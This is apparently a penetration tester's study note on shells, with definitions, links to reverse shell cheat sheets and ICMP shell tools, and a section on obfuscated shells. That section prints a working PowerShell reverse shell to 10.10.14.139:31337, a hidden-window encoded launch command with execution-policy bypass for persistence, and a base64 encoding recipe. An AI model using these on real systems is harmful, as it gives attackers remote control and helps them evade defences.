# Shells

## Introduction

A shell is the user interface of a system, either in a form of a Command Line Interface or Graphical User Interface, is used to interact with system.  To differentiate, modern terminals are still GUIs applications whereas a Headless install of a OS would closer to 20th Century common user interaction with a system. This article is conceptual breakdown of types of shells:
- For large maintained list of reverse shells check: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Cheatsheet from `highoncoffee`.
- Generate reverse shells with [revshells](https://www.revshells.com/). 
- Hack-Tools browser plugin also has reverse shell generator for [Chrome](https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi) and [Firefox](https://addons.mozilla.org/en-US/firefox/addon/hacktools/)

## Shells 101

A shell is command line or graphical user interface of a system, the outermost layer to interact with it. Some example commands to demonstrate usage here list of Linux networking commands help. For more see [[Core-Linux-Commands]]. For  useful list of windows commands see [[Windows-Commands]]

## Linux Shells

The trailing `$` or `#` character indicates that the shell is awaiting your input and also indicates whether Bash recognises you as a normal user with `$`  or as a root  `#`.

## Bind and Reverse Shells

[[Bind-And-Reverse-Shells-Defined]] for explanations, alternative frameworks and tool or [[Reverse-Shells-Listing]] for something close to PayloadAllTheThings, but just for shells

## ICMP Shells

[[Nishang-Helpsheet]] has an  [ICMP reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1), requires `python2`
[Bdamele](https://github.com/bdamele/icmpsh)'s ICMP shell 

## Encoding / Obfuscated Shells

`Start-Process` [[Persistence]] for the 2 is 1 and 1 is none MalwareJake mentality 
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc $b64EncodeShellOrCmdToShell
```

[[PowerShell]] Filter evasion
```powershell
$a = New-Object System.Net.Sockets.TCPClient('10.10.14.139',31337);$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($i = $b.Read($c, 0, $c.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $i);$f = (iex $d 2>&1 | Out-String );$g = $f + 'PS ' + (pwd).Path + '> ';$e = ([text.encoding]::ASCII).GetBytes($g);$b.Write($e,0,$e.Length);$b.Flush()};$a.Close()
# client -> a
# stream -> b
# bytes -> c
# data -> d
# sendbyte -> e
# sendback -> f
# sendback2 -> f2 -> g
```

Base64 encoding with width 0 (no `=` symbol) with Linux `iconv` from ASCII to UTF-16LE then remove newlines and 
```bash
iconv -f ASCII -t UTF-16LE rshell.txt | tr -d "\n" | base64 -w0 
```

[gh0x0st/Get-ReverseShell](https://github.com/gh0x0st/Get-ReverseShell/tree/main) is *"a solution to create obfuscated reverse shells for PowerShell."*

## References

[Chrome](https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi) 
[Firefox](https://addons.mozilla.org/en-US/firefox/addon/hacktools/)
[Bdamele's icmpsh](https://github.com/bdamele/icmpsh)
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
[gh0x0st/Get-ReverseShell](https://github.com/gh0x0st/Get-ReverseShell/tree/main) 